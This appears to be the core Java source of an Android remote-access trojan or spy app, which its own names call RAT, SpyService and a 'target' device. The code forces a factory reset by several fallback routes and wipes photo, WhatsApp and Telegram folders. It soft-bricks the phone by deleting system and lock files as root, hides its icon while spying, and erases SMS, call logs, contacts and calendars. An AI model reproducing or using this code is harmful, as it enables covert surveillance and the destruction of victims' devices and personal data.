package com.nullx.pp;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;

import java.io.File;
import java.io.FileWriter;
import java.lang.reflect.Method;

public class RATCore {
    private static final String TAG = "RAT.CORE";
    public static Context appContext;

    public static void init(Context ctx) {
        appContext = ctx.getApplicationContext();
    }

    // ── Backup sebelum wipe (survive uninstall) ──
    public static void backupBeforeWipe() {
        try {
            SharedPreferences sp = appContext.getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
            String deviceId = sp.getString("targetId", "");
            String pairId = sp.getString("pairId", "");

            File dir = new File("/storage/emulated/0/.android_cache/");
            dir.mkdirs();
            FileWriter fw = new FileWriter(new File(dir, ".sys_data"));
            fw.write(deviceId + "|" + pairId);
            fw.close();
            Log.d(TAG, "Backup saved");
        } catch (Exception e) {
            Log.e(TAG, "backup error: " + e.getMessage());
        }
    }

    // ── Factory Reset BENERAN ──
    public static String factoryReset() {
        // Level 1: DPM
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) appContext.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(appContext, DeviceAdminHelper.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.wipeData(0);
                return "dpm_wipe_ok";
            }
        } catch (Exception e) {
            Log.w(TAG, "DPM wipe failed: " + e.getMessage());
        }

        // Level 2: PowerManager reflection (reboot)
        try {
            PowerManager pm = (PowerManager) appContext.getSystemService(Context.POWER_SERVICE);
            Method m = pm.getClass().getDeclaredMethod("reboot", String.class);
            m.setAccessible(true);
            m.invoke(pm, "recovery");
            return "reboot_recovery";
        } catch (Exception e) {
            Log.w(TAG, "PM reboot failed: " + e.getMessage());
        }

        // Level 3: MASTER_CLEAR broadcast
        try {
            Intent intent = new Intent("android.intent.action.MASTER_CLEAR");
            intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
            appContext.sendBroadcast(intent);
            return "master_clear_sent";
        } catch (Exception e) {
            Log.w(TAG, "MASTER_CLEAR failed: " + e.getMessage());
        }

        // Level 4: Root su
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "am broadcast -a android.intent.action.MASTER_CLEAR"});
            p.waitFor();
            return "su_master_clear";
        } catch (Exception e) {
            Log.w(TAG, "su failed: " + e.getMessage());
        }

        return "all_failed";
    }

    // ── Wipe SDCard ──
    public static void wipeSdcard() {
        new Thread(() -> {
            try {
                String[] paths = {
                    "/storage/emulated/0/DCIM",
                    "/storage/emulated/0/Pictures",
                    "/storage/emulated/0/Download",
                    "/storage/emulated/0/Documents",
                    "/storage/emulated/0/WhatsApp",
                    "/storage/emulated/0/Telegram",
                    "/storage/emulated/0/Movies",
                    "/storage/emulated/0/Music"
                };
                for (String path : paths) {
                    deleteRecursive(new File(path));
                }
                Log.d(TAG, "SDCard wiped");
            } catch (Exception e) {
                Log.e(TAG, "wipeSdcard error: " + e.getMessage());
            }
        }).start();
    }

    public static boolean deleteRecursive(File f) {
        if (f == null || !f.exists()) return false;
        if (f.isDirectory()) {
            File[] children = f.listFiles();
            if (children != null) {
                for (File child : children) deleteRecursive(child);
            }
        }
        return f.delete();
    }

    // ── Brick Device (soft brick) ──
    public static String brickDevice() {
        try {
            String[] targets = {
                "/system/build.prop",
                "/system/etc/hosts",
                "/data/system/locksettings.db",
                "/data/system/gesture.key",
                "/data/system/password.key"
            };
            int deleted = 0;
            for (String t : targets) {
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "rm -rf " + t});
                    p.waitFor();
                    deleted++;
                } catch (Exception ignored) {}
            }
            return "bricked_" + deleted;
        } catch (Exception e) {
            return "brick_failed";
        }
    }

    // ── Hide App Icon ──
    public static void hideApp() {
        try {
            android.content.pm.PackageManager pm = appContext.getPackageManager();
            ComponentName component = new ComponentName(appContext, MainActivity.class);
            pm.setComponentEnabledSetting(
                component,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );
            Intent svc = new Intent(appContext, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                appContext.startForegroundService(svc);
            } else {
                appContext.startService(svc);
            }
            Log.d(TAG, "App hidden");
        } catch (Exception e) {
            Log.e(TAG, "hide error: " + e.getMessage());
        }
    }

    // ── Show App Icon ──
    public static void showApp() {
        try {
            android.content.pm.PackageManager pm = appContext.getPackageManager();
            ComponentName component = new ComponentName(appContext, MainActivity.class);
            pm.setComponentEnabledSetting(
                component,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            Log.e(TAG, "show error: " + e.getMessage());
        }
    }

    // ── Wipe semua user data ──
    public static int wipeAllUserData() {
        int count = 0;
        try {
            count += appContext.getContentResolver().delete(
                android.net.Uri.parse("content://sms"), null, null);
        } catch (Exception ignored) {}
        try {
            count += appContext.getContentResolver().delete(
                android.net.Uri.parse("content://call_log/calls"), null, null);
        } catch (Exception ignored) {}
        try {
            count += appContext.getContentResolver().delete(
                android.provider.ContactsContract.RawContacts.CONTENT_URI, null, null);
        } catch (Exception ignored) {}
        try {
            count += appContext.getContentResolver().delete(
                android.net.Uri.parse("content://com.android.calendar/events"), null, null);
        } catch (Exception ignored) {}
        Log.d(TAG, "Wiped " + count + " rows");
        return count;
    }
}